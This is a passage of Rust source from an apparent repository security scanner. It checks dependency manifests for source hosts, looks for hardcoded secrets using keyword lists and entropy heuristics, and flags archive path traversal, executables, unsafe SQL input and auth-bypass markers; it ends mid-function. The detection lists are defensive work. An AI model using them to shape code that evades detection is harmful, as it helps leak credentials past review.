fn extract_registry_host(value: &str) -> Option<String> {
    let trimmed = trim_wrapping_quotes(value.trim());
    if trimmed.is_empty() {
        return None;
    }

    let without_scheme = if let Some((_, rest)) = trimmed.split_once("://") {
        rest
    } else {
        trimmed.trim_start_matches("//")
    };
    let host = without_scheme
        .split(['/', '?', '#', ' '])
        .next()
        .unwrap_or_default()
        .trim()
        .trim_end_matches('/');
    if host.is_empty() {
        return None;
    }

    Some(host.to_ascii_lowercase())
}

fn pipfile_lock_source_hosts(value: &Value) -> HashMap<String, String> {
    let mut hosts = HashMap::new();

    let Some(sources) = value
        .get("_meta")
        .and_then(|meta| meta.get("sources"))
        .and_then(Value::as_array)
    else {
        return hosts;
    };

    for source in sources {
        let Some(source) = source.as_object() else {
            continue;
        };
        let Some(name) = source.get("name").and_then(Value::as_str) else {
            continue;
        };
        let Some(host) = source
            .get("url")
            .and_then(Value::as_str)
            .and_then(extract_registry_host)
        else {
            continue;
        };
        hosts.insert(name.to_string(), host);
    }

    hosts
}

fn dependency_spec_host(spec: &str) -> Option<String> {
    let trimmed = spec.trim().trim_matches('"').trim_matches('\'');
    if let Some(url) = trimmed.strip_prefix("git+") {
        return extract_registry_host(url);
    }
    if trimmed.starts_with("http://")
        || trimmed.starts_with("https://")
        || trimmed.starts_with("git://")
    {
        return extract_registry_host(trimmed);
    }
    if trimmed.starts_with("github:") {
        return Some("github.com".to_string());
    }
    if trimmed.starts_with("gitlab:") {
        return Some("gitlab.com".to_string());
    }
    if trimmed.starts_with("bitbucket:") {
        return Some("bitbucket.org".to_string());
    }

    None
}

fn python_requirement_direct_host(line: &str) -> Option<(String, String)> {
    let (name, url) = line.split_once(" @ ")?;
    let normalized_name = name
        .trim()
        .split(['[', ' '])
        .next()
        .unwrap_or_default()
        .trim();
    let host = extract_registry_host(url.trim())?;
    if normalized_name.is_empty() {
        return None;
    }

    Some((normalized_name.to_string(), host))
}

fn python_inline_source_section(section: &str) -> bool {
    section == "[tool.poetry.dependencies]"
        || section == "[tool.uv.sources]"
        || (section.starts_with("[tool.poetry.group.") && section.ends_with(".dependencies]"))
}

fn python_named_inline_source_host(line: &str) -> Option<(String, String)> {
    let (raw_name, raw_value) = line.split_once('=')?;
    let name = trim_wrapping_quotes(raw_name.trim());
    if name.is_empty() {
        return None;
    }

    let value = raw_value.trim();
    if !value.starts_with('{') || !value.ends_with('}') {
        return None;
    }

    let source = inline_table_string_value(value, "git")
        .or_else(|| inline_table_string_value(value, "url"))
        .or_else(|| inline_table_string_value(value, "file"))?;
    let host = extract_registry_host(source)?;

    Some((name.to_string(), host))
}

fn inline_table_string_value<'a>(value: &'a str, key: &str) -> Option<&'a str> {
    let inner = value
        .trim()
        .trim_start_matches('{')
        .trim_end_matches('}')
        .trim();

    for entry in inner.split(',') {
        let (candidate_key, candidate_value) = entry.split_once('=')?;
        if candidate_key.trim() != key {
            continue;
        }
        return Some(trim_wrapping_quotes(candidate_value.trim()));
    }

    None
}

fn ruby_manifest_dependency_host(line: &str) -> Option<(String, String)> {
    let trimmed = line.trim();
    let trimmed = trimmed.strip_prefix("gem ")?;
    let (name, remainder) = parse_quoted_literal(trimmed)?;
    let remainder = remainder.trim();

    if let Some(value) = ruby_option_value(remainder, "source:") {
        let host = extract_registry_host(value)?;
        return Some((name.to_string(), host));
    }

    if let Some(value) = ruby_option_value(remainder, "git:") {
        let host = extract_registry_host(value)?;
        return Some((name.to_string(), host));
    }

    if ruby_option_value(remainder, "github:").is_some() {
        return Some((name.to_string(), "github.com".to_string()));
    }

    if ruby_option_value(remainder, "gist:").is_some() {
        return Some((name.to_string(), "gist.github.com".to_string()));
    }

    None
}

fn ruby_option_value<'a>(line: &'a str, key: &str) -> Option<&'a str> {
    let (_, remainder) = line.split_once(key)?;
    let remainder = remainder.trim_start();
    let (value, _) = parse_quoted_literal(remainder)?;
    Some(value)
}

fn parse_quoted_literal(value: &str) -> Option<(&str, &str)> {
    let trimmed = value.trim_start();
    let quote = trimmed.chars().next()?;
    if !matches!(quote, '"' | '\'') {
        return None;
    }
    let after_quote = &trimmed[quote.len_utf8()..];
    let end = after_quote.find(quote)?;
    let literal = &after_quote[..end];
    let remainder = &after_quote[end + quote.len_utf8()..];
    Some((literal, remainder))
}

fn gemfile_lock_spec_name(line: &str) -> Option<String> {
    let trimmed = line.trim();
    let name = trimmed
        .split_once(" (")
        .map(|(name, _)| name)
        .unwrap_or(trimmed)
        .trim_end_matches(':')
        .trim();
    if name.is_empty() {
        return None;
    }

    Some(name.to_string())
}

fn changed_file<'a>(candidate_files: &'a [PathBuf], file_name: &str) -> Option<&'a PathBuf> {
    candidate_files.iter().find(|file| {
        file.file_name()
            .and_then(|value| value.to_str())
            .is_some_and(|value| value == file_name)
    })
}

fn changed_any_file<'a>(
    candidate_files: &'a [PathBuf],
    file_names: &[&str],
) -> Option<&'a PathBuf> {
    candidate_files.iter().find(|file| {
        file.file_name()
            .and_then(|value| value.to_str())
            .is_some_and(|value| file_names.contains(&value))
    })
}

fn changed_any_path_suffix<'a>(
    candidate_files: &'a [PathBuf],
    suffixes: &[&str],
) -> Option<&'a PathBuf> {
    candidate_files.iter().find(|file| {
        suffixes
            .iter()
            .any(|suffix| file.to_string_lossy().ends_with(suffix))
    })
}

fn cargo_dependency_snapshot_changed(
    context: &ExecutionContext,
    manifest_path: &Path,
) -> AppResult<bool> {
    let current_manifest = fs::read_to_string(context.repo_root.join(manifest_path))?;
    let current_snapshot = cargo_dependency_snapshot(&current_manifest);
    let Some(baseline_manifest) = baseline_file_contents(context, manifest_path)? else {
        return Ok(!current_snapshot.is_empty());
    };
    let baseline_snapshot = cargo_dependency_snapshot(&baseline_manifest);
    Ok(current_snapshot != baseline_snapshot)
}

fn go_dependency_snapshot_changed(
    context: &ExecutionContext,
    manifest_path: &Path,
) -> AppResult<bool> {
    let current_manifest = fs::read_to_string(context.repo_root.join(manifest_path))?;
    let current_snapshot = go_dependency_snapshot(&current_manifest);
    let Some(baseline_manifest) = baseline_file_contents(context, manifest_path)? else {
        return Ok(!current_snapshot.is_empty());
    };
    let baseline_snapshot = go_dependency_snapshot(&baseline_manifest);
    Ok(current_snapshot != baseline_snapshot)
}

fn gemfile_dependency_snapshot_changed(
    context: &ExecutionContext,
    manifest_path: &Path,
) -> AppResult<bool> {
    let current_manifest = fs::read_to_string(context.repo_root.join(manifest_path))?;
    let current_snapshot = gemfile_dependency_snapshot(&current_manifest);
    let Some(baseline_manifest) = baseline_file_contents(context, manifest_path)? else {
        return Ok(!current_snapshot.is_empty());
    };
    let baseline_snapshot = gemfile_dependency_snapshot(&baseline_manifest);
    Ok(current_snapshot != baseline_snapshot)
}

fn baseline_file_contents(context: &ExecutionContext, path: &Path) -> AppResult<Option<String>> {
    if !context.repo_root.join(".git").exists() {
        return Ok(None);
    }

    let reference = match context.action {
        ProtectedAction::Scan => Some("HEAD"),
        ProtectedAction::Push => match context.push_status.as_ref() {
            Some(PushStatus::Ready {
                upstream_branch: Some(upstream),
                ..
            }) => Some(upstream.as_str()),
            Some(PushStatus::Ready {
                upstream_branch: None,
                ..
            }) => None,
            _ => None,
        },
    };

    let Some(reference) = reference else {
        return Ok(None);
    };

    git::file_contents_at_ref(&context.repo_root, reference, path)
}

fn cargo_dependency_snapshot(contents: &str) -> Vec<String> {
    let mut snapshot = Vec::new();
    let mut current_section = String::new();

    for line in contents.lines() {
        let trimmed = strip_inline_comment(line).trim();
        if trimmed.is_empty() {
            continue;
        }

        if trimmed.starts_with('[') && trimmed.ends_with(']') {
            current_section = trimmed.to_string();
            if cargo_dependency_section_name(trimmed).is_some() {
                snapshot.push(trimmed.to_string());
            }
            continue;
        }

        if cargo_dependency_section_name(&current_section).is_some() {
            snapshot.push(trimmed.to_string());
        }
    }

    snapshot
}

fn go_dependency_snapshot(contents: &str) -> Vec<String> {
    let mut snapshot = Vec::new();
    let mut current_block: Option<&str> = None;

    for line in contents.lines() {
        let trimmed = strip_inline_comment(line).trim();
        if trimmed.is_empty() {
            continue;
        }

        if trimmed == ")" {
            current_block = None;
            continue;
        }

        if let Some(block_name) = current_block {
            snapshot.push(format!("{block_name}:{trimmed}"));
            continue;
        }

        for block_name in ["require", "replace", "exclude", "retract"] {
            if trimmed == format!("{block_name} (") {
                current_block = Some(block_name);
                snapshot.push(trimmed.to_string());
                break;
            }
        }

        if current_block.is_some() {
            continue;
        }

        if ["require ", "replace ", "exclude ", "retract "]
            .iter()
            .any(|prefix| trimmed.starts_with(prefix))
        {
            snapshot.push(trimmed.to_string());
        }
    }

    snapshot
}

fn gemfile_dependency_snapshot(contents: &str) -> Vec<String> {
    let mut snapshot = Vec::new();

    for line in contents.lines() {
        let trimmed = strip_inline_comment(line).trim();
        if trimmed.is_empty() {
            continue;
        }

        if trimmed.starts_with("source ")
            || trimmed.starts_with("git_source(")
            || trimmed.starts_with("gem ")
            || trimmed.starts_with("path ")
            || trimmed.starts_with("gemspec")
        {
            snapshot.push(trimmed.to_string());
        }
    }

    snapshot
}

fn cargo_dependency_section_name(section: &str) -> Option<&str> {
    if section.contains("dependencies") || section.starts_with("[patch.") || section == "[replace]"
    {
        return Some(section);
    }

    None
}

fn looks_like_local_path_reference(value: &str) -> bool {
    value.starts_with("./")
        || value.starts_with("../")
        || value.starts_with('/')
        || matches!(value, "." | "..")
}

fn read_text_file(path: &Path) -> AppResult<Option<String>> {
    let Some(metadata) = read_file_metadata(path)? else {
        return Ok(None);
    };

    if metadata.len() > MAX_TEXT_SCAN_BYTES {
        return Ok(None);
    }

    let bytes = fs::read(path)?;
    if bytes.contains(&0) {
        return Ok(None);
    }

    match String::from_utf8(bytes) {
        Ok(contents) => Ok(Some(contents)),
        Err(_) => Ok(None),
    }
}

fn repo_text_file(path: &Path) -> AppResult<Option<String>> {
    if !path.exists() {
        return Ok(None);
    }

    read_text_file(path)
}

fn read_file_metadata(path: &Path) -> AppResult<Option<fs::Metadata>> {
    match fs::metadata(path) {
        Ok(metadata) => Ok(Some(metadata)),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(None),
        Err(error) => Err(error.into()),
    }
}

fn read_file_prefix(path: &Path, max_bytes: usize) -> AppResult<Vec<u8>> {
    let bytes = fs::read(path)?;
    Ok(bytes.into_iter().take(max_bytes).collect())
}

fn record_finding(findings: &mut Vec<Finding>, seen: &mut HashSet<String>, finding: Finding) {
    if seen.insert(finding.fingerprint.clone()) {
        findings.push(finding);
    }
}

fn rust_test_line_mask(file: &Path, contents: &str) -> Vec<bool> {
    if file.extension().and_then(|value| value.to_str()) != Some("rs") {
        return Vec::new();
    }

    let mut mask = vec![false; contents.lines().count() + 1];
    let mut brace_depth = 0isize;
    let mut pending_cfg_test = false;
    let mut pending_test_fn = false;
    let mut active_blocks = Vec::new();

    for (index, line) in contents.lines().enumerate() {
        let line_number = index + 1;
        let trimmed = line.trim();

        if !active_blocks.is_empty() {
            mask[line_number] = true;
        }

        if trimmed.starts_with("#[cfg(test)]") {
            pending_cfg_test = true;
            mask[line_number] = true;
        }

        if trimmed.starts_with("#[test]") {
            pending_test_fn = true;
            mask[line_number] = true;
        }

        if pending_cfg_test && looks_like_rust_test_block_start(trimmed) {
            active_blocks.push(brace_depth);
            pending_cfg_test = false;
            mask[line_number] = true;
        } else if pending_test_fn && looks_like_rust_function_start(trimmed) {
            active_blocks.push(brace_depth);
            pending_test_fn = false;
            mask[line_number] = true;
        } else if !trimmed.is_empty() && !trimmed.starts_with("#[") {
            pending_cfg_test = false;
            pending_test_fn = false;
        }

        brace_depth += brace_delta(line);
        while active_blocks
            .last()
            .is_some_and(|start_depth| brace_depth <= *start_depth)
        {
            active_blocks.pop();
        }
    }

    mask
}

fn looks_like_rust_test_block_start(trimmed: &str) -> bool {
    trimmed.contains('{')
        && (trimmed.starts_with("mod ")
            || trimmed.starts_with("pub mod ")
            || trimmed.starts_with("fn ")
            || trimmed.starts_with("pub fn "))
}

fn looks_like_rust_function_start(trimmed: &str) -> bool {
    trimmed.contains('{')
        && (trimmed.starts_with("fn ")
            || trimmed.starts_with("pub fn ")
            || trimmed.starts_with("async fn ")
            || trimmed.starts_with("pub async fn "))
}

fn should_skip_line(mask: &[bool], line_number: usize) -> bool {
    mask.get(line_number).copied().unwrap_or(false)
}

fn strip_inline_comment(line: &str) -> &str {
    let mut in_single_quotes = false;
    let mut in_double_quotes = false;

    for (index, character) in line.char_indices() {
        match character {
            '\'' if !in_double_quotes => in_single_quotes = !in_single_quotes,
            '"' if !in_single_quotes => in_double_quotes = !in_double_quotes,
            '#' if !in_single_quotes && !in_double_quotes => return &line[..index],
            _ => {}
        }
    }

    line
}

fn normalize_identifier(identifier: &str) -> String {
    identifier
        .chars()
        .filter(|character| character.is_ascii_alphanumeric() || *character == '_')
        .flat_map(|character| character.to_lowercase())
        .collect()
}

fn is_sensitive_identifier(identifier: &str) -> bool {
    [
        "secret",
        "token",
        "password",
        "passwd",
        "apikey",
        "api_key",
        "privatekey",
        "private_key",
        "clientsecret",
        "client_secret",
        "accesskey",
        "access_key",
        "auth_token",
        "bearer",
    ]
    .iter()
    .any(|needle| identifier.contains(needle))
}

fn extract_assignment(line: &str) -> Option<(String, &str)> {
    let trimmed = line.trim();
    let without_export = trimmed.strip_prefix("export ").unwrap_or(trimmed);

    let (left, right) = without_export
        .split_once('=')
        .or_else(|| without_export.split_once(':'))?;

    let key = left.trim().trim_matches('"').trim_matches('\'').to_string();
    let value = right.trim();

    if key.is_empty() || value.is_empty() {
        return None;
    }

    if !looks_assignment_key(&key) || !looks_literal_secret_value(value) {
        return None;
    }

    Some((key, value))
}

fn trim_wrapping_quotes(value: &str) -> &str {
    value.trim().trim_matches('"').trim_matches('\'').trim()
}

fn yaml_scalar_value<'a>(line: &'a str, key: &str) -> Option<&'a str> {
    let value = line.strip_prefix(key)?;
    Some(trim_wrapping_quotes(value.trim()))
}

fn toml_assignment_value<'a>(line: &'a str, key: &str) -> Option<&'a str> {
    let (candidate_key, raw_value) = line.split_once('=')?;
    if candidate_key.trim() != key {
        return None;
    }

    Some(trim_wrapping_quotes(raw_value.trim()))
}

fn looks_like_placeholder(value: &str) -> bool {
    let lower = value.to_ascii_lowercase();

    if lower.is_empty() {
        return true;
    }

    if [
        "example",
        "sample",
        "test",
        "dummy",
        "placeholder",
        "changeme",
        "replace-me",
        "your_token_here",
        "your-api-key",
        "your_api_key",
        "insert-secret-here",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
    {
        return true;
    }

    if lower.ends_with("example") || lower.ends_with("_example") {
        return true;
    }

    let distinct_characters = lower.chars().collect::<HashSet<_>>().len();
    distinct_characters <= 2 && lower.len() >= 8
}

fn looks_like_template_expression(value: &str) -> bool {
    value.starts_with("${")
        || value.starts_with("{{")
        || value.starts_with('<')
        || value.ends_with('>')
        || value.contains("{{")
        || value.contains("}}")
}

fn looks_assignment_key(key: &str) -> bool {
    !key.is_empty()
        && key.chars().all(|character| {
            character.is_ascii_alphanumeric() || matches!(character, '_' | '-' | '.' | '"' | '\'')
        })
}

fn looks_literal_secret_value(value: &str) -> bool {
    let normalized = trim_wrapping_quotes(value.trim_matches(',').trim());
    !normalized.is_empty()
        && !normalized
            .chars()
            .any(|character| character.is_whitespace())
        && !normalized
            .chars()
            .any(|character| matches!(character, '(' | ')' | '{' | '}' | '[' | ']' | ';' | '`'))
}

fn looks_structured_secret(value: &str) -> bool {
    looks_base64ish(value) || looks_hexish(value) || looks_jwt(value)
}

fn looks_like_demo_credentials(value: &str) -> bool {
    let Some((username, password)) = value.split_once(':') else {
        return false;
    };

    matches!(
        username.trim().to_ascii_lowercase().as_str(),
        "user" | "username" | "example" | "demo"
    ) && matches!(
        password.trim().to_ascii_lowercase().as_str(),
        "password" | "passwd" | "secret" | "token" | "example" | "demo"
    )
}

fn looks_base64ish(value: &str) -> bool {
    value.len() >= 24
        && value
            .chars()
            .all(|character| character.is_ascii_alphanumeric() || "+/=_-".contains(character))
}

fn looks_hexish(value: &str) -> bool {
    value.len() >= 32 && value.chars().all(|character| character.is_ascii_hexdigit())
}

fn looks_jwt(value: &str) -> bool {
    let mut parts = value.split('.');
    let (Some(first), Some(second), Some(third)) = (parts.next(), parts.next(), parts.next())
    else {
        return false;
    };

    parts.next().is_none()
        && first.len() >= 8
        && second.len() >= 8
        && third.len() >= 8
        && [first, second, third].iter().all(|part| {
            part.chars().all(|character| {
                character.is_ascii_alphanumeric() || character == '-' || character == '_'
            })
        })
}

fn shannon_entropy(value: &str) -> f64 {
    let mut counts = [0usize; 256];
    let bytes = value.as_bytes();

    for byte in bytes {
        counts[*byte as usize] += 1;
    }

    let length = bytes.len() as f64;
    counts
        .iter()
        .filter(|count| **count > 0)
        .map(|count| {
            let probability = *count as f64 / length;
            -probability * probability.log2()
        })
        .sum()
}

fn extract_prefixed_tokens(
    line: &str,
    prefix: &str,
    min_length: usize,
    max_length: Option<usize>,
    allowed: CharacterClass,
) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut start = 0usize;

    while let Some(relative_index) = line[start..].find(prefix) {
        let index = start + relative_index;
        let after_prefix = &line[index..];
        let mut end = index;

        for (offset, character) in after_prefix.char_indices() {
            if offset == 0 || allowed.allows(character) {
                end = index + offset + character.len_utf8();
            } else {
                break;
            }
        }

        let candidate = &line[index..end];
        let length_ok = candidate.len() >= min_length
            && max_length.is_none_or(|maximum| candidate.len() <= maximum);
        if length_ok {
            tokens.push(candidate.to_string());
        }

        start = index + prefix.len();
    }

    tokens
}

fn is_execution_surface(file: &Path) -> bool {
    let lower = file.to_string_lossy().to_ascii_lowercase();
    let file_name = file
        .file_name()
        .and_then(|value| value.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();

    lower.contains(".github/workflows")
        || file_name == "dockerfile"
        || lower.ends_with(".sh")
        || lower.ends_with(".bash")
        || lower.ends_with(".zsh")
        || lower.ends_with(".ps1")
}

fn looks_like_archive_artifact(file: &Path, prefix: &[u8]) -> bool {
    matches!(
        file.extension()
            .and_then(|value| value.to_str())
            .unwrap_or_default()
            .to_ascii_lowercase()
            .as_str(),
        "zip" | "jar" | "war" | "ear" | "tar" | "tgz" | "gz" | "bz2" | "xz" | "7z"
    ) || prefix.starts_with(b"PK\x03\x04")
        || prefix.starts_with(&[0x1f, 0x8b])
        || prefix.starts_with(b"7z\xBC\xAF\x27\x1C")
        || prefix.starts_with(&[0xfd, b'7', b'z', b'X', b'Z', 0x00])
        || prefix.starts_with(b"BZh")
}

fn looks_like_zip_style_archive(file: &Path, prefix: &[u8]) -> bool {
    matches!(
        file.extension()
            .and_then(|value| value.to_str())
            .unwrap_or_default()
            .to_ascii_lowercase()
            .as_str(),
        "zip" | "jar" | "war" | "ear" | "apk"
    ) || prefix.starts_with(b"PK\x03\x04")
        || prefix.starts_with(b"PK\x01\x02")
}

fn zip_style_archive_entry_names(bytes: &[u8]) -> Vec<String> {
    let mut entries = Vec::new();
    let mut index = 0usize;

    while index + 46 <= bytes.len() {
        let Some(relative) = bytes[index..]
            .windows(4)
            .position(|window| window == b"PK\x01\x02")
        else {
            break;
        };
        let start = index + relative;
        if start + 46 > bytes.len() {
            break;
        }

        let name_len = u16::from_le_bytes([bytes[start + 28], bytes[start + 29]]) as usize;
        let extra_len = u16::from_le_bytes([bytes[start + 30], bytes[start + 31]]) as usize;
        let comment_len = u16::from_le_bytes([bytes[start + 32], bytes[start + 33]]) as usize;
        let name_start = start + 46;
        let name_end = name_start + name_len;
        if name_end > bytes.len() {
            break;
        }

        let name = String::from_utf8_lossy(&bytes[name_start..name_end]).to_string();
        if !name.is_empty() {
            entries.push(name);
        }

        index = name_end.saturating_add(extra_len).saturating_add(comment_len);
    }

    entries
}

fn archive_entry_has_path_traversal(entry: &str) -> bool {
    let normalized = entry.replace('\\', "/");
    let lower = normalized.to_ascii_lowercase();

    normalized.starts_with('/')
        || normalized.starts_with("\\")
        || normalized.split('/').any(|segment| segment == "..")
        || (lower.len() >= 3
            && lower.as_bytes()[1] == b':'
            && lower.as_bytes()[2] == b'/'
            && lower.as_bytes()[0].is_ascii_alphabetic())
}

fn archive_entry_looks_executable(entry: &str) -> bool {
    let normalized = entry.replace('\\', "/");
    let lower = normalized.to_ascii_lowercase();

    if lower.ends_with('/') {
        return false;
    }

    [
        ".exe",
        ".dll",
        ".so",
        ".dylib",
        ".bat",
        ".cmd",
        ".ps1",
        ".sh",
        ".msi",
        ".appimage",
        ".scr",
    ]
    .iter()
    .any(|suffix| lower.ends_with(suffix))
        || lower.starts_with("bin/")
        || lower.contains("/bin/")
}

fn compiled_binary_kind(file: &Path, prefix: &[u8]) -> Option<&'static str> {
    let extension = file
        .extension()
        .and_then(|value| value.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();

    if prefix.starts_with(b"\x7fELF") {
        return Some("ELF executable or library");
    }
    if prefix.starts_with(b"MZ") || matches!(extension.as_str(), "exe" | "dll") {
        return Some("PE executable or library");
    }
    if prefix.starts_with(&[0xfe, 0xed, 0xfa, 0xce])
        || prefix.starts_with(&[0xce, 0xfa, 0xed, 0xfe])
        || prefix.starts_with(&[0xfe, 0xed, 0xfa, 0xcf])
        || prefix.starts_with(&[0xcf, 0xfa, 0xed, 0xfe])
        || prefix.starts_with(&[0xca, 0xfe, 0xba, 0xbe])
        || matches!(extension.as_str(), "dylib" | "app")
    {
        return Some("Mach-O binary");
    }
    if matches!(extension.as_str(), "so" | "a" | "o" | "lib") {
        return Some("native library artifact");
    }

    None
}

fn path_is_source_like(file: &Path) -> bool {
    let lower = file.to_string_lossy().to_ascii_lowercase();
    [
        "src/",
        "app/",
        "lib/",
        "server/",
        "client/",
        "web/",
        "pages/",
        "api/",
        "handlers/",
    ]
    .iter()
    .any(|prefix| lower.starts_with(prefix))
}

fn path_is_generated_asset_like(file: &Path) -> bool {
    let lower = file.to_string_lossy().to_ascii_lowercase();
    [
        "dist/",
        "build/",
        "public/",
        "static/",
        "assets/",
        "vendor/",
        "release/",
        "out/",
        "wwwroot/",
        ".next/static/",
    ]
    .iter()
    .any(|prefix| lower.starts_with(prefix))
}

fn path_is_public_distribution_like(file: &Path) -> bool {
    let lower = file.to_string_lossy().to_ascii_lowercase();
    [
        "dist/",
        "public/",
        "static/",
        "assets/",
        "wwwroot/",
        ".next/static/",
    ]
    .iter()
    .any(|prefix| lower.starts_with(prefix))
}

fn path_is_normal_script_container(file: &Path) -> bool {
    let lower = file.to_string_lossy().to_ascii_lowercase();
    [
        "scripts/",
        "bin/",
        "tools/",
        "hack/",
        "ops/",
        "deploy/",
        ".github/",
    ]
    .iter()
    .any(|prefix| lower.starts_with(prefix))
}

fn looks_like_executable_text_artifact(file: &Path, prefix: &[u8], contents: &str) -> bool {
    if compiled_binary_kind(file, prefix).is_some() || looks_like_archive_artifact(file, prefix) {
        return false;
    }

    let starts_with_shebang = prefix.starts_with(b"#!");
    let lower = contents.to_ascii_lowercase();
    let extension = file
        .extension()
        .and_then(|value| value.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();

    starts_with_shebang
        || matches!(
            extension.as_str(),
            "sh" | "bash" | "zsh" | "ksh" | "command" | "ps1" | "py" | "rb" | "pl"
        )
        || lower.starts_with("@echo off")
}

#[cfg(unix)]
fn file_is_executable(metadata: &fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;

    metadata.permissions().mode() & 0o111 != 0
}

#[cfg(not(unix))]
fn file_is_executable(_metadata: &fs::Metadata) -> bool {
    false
}

fn looks_like_minified_javascript(contents: &str) -> bool {
    let line_count = contents.lines().count();
    let longest_line = contents.lines().map(str::len).max().unwrap_or(0);
    let average_line_length = if line_count == 0 {
        0
    } else {
        contents.len() / line_count
    };

    contents.len() >= 512 && line_count <= 5 && longest_line >= 400 && average_line_length >= 120
}

fn suspicious_ignore_pattern(ignore_paths: &[String], contents: &str) -> Option<(String, usize)> {
    let sensitive_patterns = [
        "src/",
        ".github/",
        ".wolfence/",
        "cargo.toml",
        "cargo.lock",
        "package.json",
        "package-lock.json",
        "npm-shrinkwrap.json",
        "pnpm-lock.yaml",
        "yarn.lock",
        "go.mod",
        "go.sum",
        "gemfile",
        "gems.rb",
        "gemfile.lock",
        "gems.locked",
        "pyproject.toml",
        "poetry.lock",
        "uv.lock",
        "pipfile",
        "pipfile.lock",
        "requirements",
        "dockerfile",
    ];

    for pattern in ignore_paths {
        let normalized = pattern.to_ascii_lowercase();
        if sensitive_patterns
            .iter()
            .any(|needle| normalized == *needle || normalized.starts_with(needle))
        {
            let line_number = find_line_number(contents, pattern).unwrap_or(1);
            return Some((pattern.clone(), line_number));
        }
    }

    for needle in sensitive_patterns {
        let Some(line_number) = find_line_number(contents, needle) else {
            continue;
        };
        return Some((needle.to_string(), line_number));
    }

    None
}

fn line_uses_untrusted_input(lower: &str) -> bool {
    [
        "req.",
        "request.",
        "request[",
        "request.args",
        "request.form",
        "request.get_json",
        "params.",
        "params[",
        "query.",
        "query[",
        "body.",
        "body[",
        "ctx.request",
        "c.query(",
        "process.argv",
        "sys.argv",
        "argv[",
        "input(",
        "stdin",
        "$_get",
        "$_post",
        "$_request",
        "gets",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

fn line_looks_like_sql_text(lower: &str) -> bool {
    [
        "select ",
        "insert into",
        "update ",
        "delete from",
        " where ",
        " from ",
        "values (",
        " set ",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

fn line_mentions_secret_generation_context(lower: &str) -> bool {
    [
        "token",
        "secret",
        "session",
        "nonce",
        "otp",
        "password",
        "passwd",
        "reset",
        "csrf",
        "api_key",
        "apikey",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

fn line_mentions_secret_material(lower: &str) -> bool {
    [
        "token",
        "secret",
        "session",
        "nonce",
        "otp",
        "password",
        "passwd",
        "reset",
        "csrf",
        "api_key",
        "apikey",
        "credential",
        "auth",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

fn line_uses_uploaded_file_context(lower: &str) -> bool {
    [
        "req.file",
        "req.files",
        "request.files",
        "$_files",
        "uploadedfile",
        "multipartfile",
        "iformfile",
        "formfile(",
        "file.originalname",
        "file.filename",
        "getoriginalfilename(",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

fn line_mentions_privilege_field(lower: &str) -> bool {
    [
        "isadmin",
        "is_admin",
        "isstaff",
        "is_staff",
        "issuperuser",
        "is_superuser",
        "role",
        "roles",
        "permission",
        "permissions",
        "scope",
        "scopes",
        "tenant_id",
        "tenantid",
        "account_id",
        "accountid",
        "owner_id",
        "ownerid",
        "org_id",
        "organization_id",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

fn line_looks_like_privilege_assignment(lower: &str) -> bool {
    let method_or_literal_match = [
        ".update(",
        ".patch(",
        "setrole(",
        "setroles(",
        "setpermission",
        "setpermissions",
        "assignrole(",
        "grantrole(",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
        || (lower.contains('{')
            && lower.contains('}')
            && [
                " role:",
                " roles:",
                " permission:",
                " permissions:",
                " isadmin:",
                " is_admin:",
                " tenant_id:",
                " account_id:",
                " owner_id:",
            ]
            .iter()
            .any(|needle| lower.contains(needle)));

    if lower.contains("==") || lower.contains("!=") {
        return method_or_literal_match;
    }

    [
        ".role =",
        ".roles =",
        ".permission =",
        ".permissions =",
        ".scope =",
        ".scopes =",
        ".isadmin =",
        ".is_admin =",
        ".isstaff =",
        ".is_staff =",
        ".issuperuser =",
        ".is_superuser =",
        ".tenant_id =",
        ".account_id =",
        ".owner_id =",
        "[\"role\"] =",
        "['role'] =",
        "[\"roles\"] =",
        "['roles'] =",
        "[\"permission\"] =",
        "['permission'] =",
        "[\"permissions\"] =",
        "['permissions'] =",
        "[\"is_admin\"] =",
        "['is_admin'] =",
        "[\"isadmin\"] =",
        "['isadmin'] =",
        "[\"owner_id\"] =",
        "['owner_id'] =",
        "[\"tenant_id\"] =",
        "['tenant_id'] =",
        "[\"account_id\"] =",
        "['account_id'] =",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
        || method_or_literal_match
}

fn line_mentions_access_control_bypass_marker(lower: &str) -> bool {
    [
        "allowany",
        "allowanonymous",
        "@permitall",
        "permitall()",
        "skipauth",
        "skip_auth",
        "skipauthorization",
        "skip_authorization",
        "skip_authorization_check",
        "skip_before_action",
        "skip_before_filter",
        "authorize: false",
        "auth: false",
        "authentication_classes([])",
        "permission_classes = [allowany]",
        "permission_classes([allowany])",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

fn file_or_line_mentions_privileged_surface(path_lower: &str, line_lower: &str) -> bool {
    [
        "/admin",
        "admin/",
        "admincontroller",
        "adminview",
        "billing",
        "tenant",
        "organization",
        "org_",
        "account",
        "member",
        "internal",
        "private",
        "staff",
        "sudo",
        "impersonat",
        "superuser",
    ]
    .iter()
    .any(|needle| path_lower.contains(needle) || line_lower.contains(needle))
}

fn is_javascript_like(file: &Path) -> bool {
    matches!(
        file.extension()
            .and_then(|value| value.to_str())
            .unwrap_or_default()
            .to_ascii_lowercase()
            .as_str(),
        "js" | "jsx" | "ts" | "tsx" | "mjs" | "cjs" | "vue" | "svelte" | "astro"
    )
}

fn is_python_like(file: &Path) -> bool {
    file.extension()
        .and_then(|value| value.to_str())
        .is_some_and(|value| value.eq_ignore_ascii_case("py"))
}

fn is_java_like(file: &Path) -> bool {
    let lower = file.to_string_lossy().to_ascii_lowercase();
    matches!(
        file.extension()
            .and_then(|value| value.to_str())
            .unwrap_or_default()
            .to_ascii_lowercase()
            .as_str(),
        "java" | "kt" | "kts" | "groovy"
    ) || lower.ends_with(".gradle")
}

fn is_php_like(file: &Path) -> bool {
    file.extension()
        .and_then(|value| value.to_str())
